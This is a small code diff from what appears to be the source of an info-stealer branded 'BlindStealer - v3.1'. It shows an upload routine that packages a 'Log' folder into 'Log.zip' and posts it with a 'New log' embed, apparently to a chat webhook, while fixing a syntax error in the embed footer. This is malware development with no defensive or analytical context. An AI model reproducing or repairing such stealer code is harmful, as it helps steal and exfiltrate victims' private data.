@@ -64,7 +64,7 @@ class Upload:
                 title="New log",
                 description="```" + '\n'.join(self.tree(Path("Log"))) + "```",
                 color=0x24262A,
-                footer(*, text=pizda, icon_url=None)
+                footer(text=pizda, icon_url=None)
             ),
             file=File("Log.zip"),
                 username="BlindStealer - v3.1",
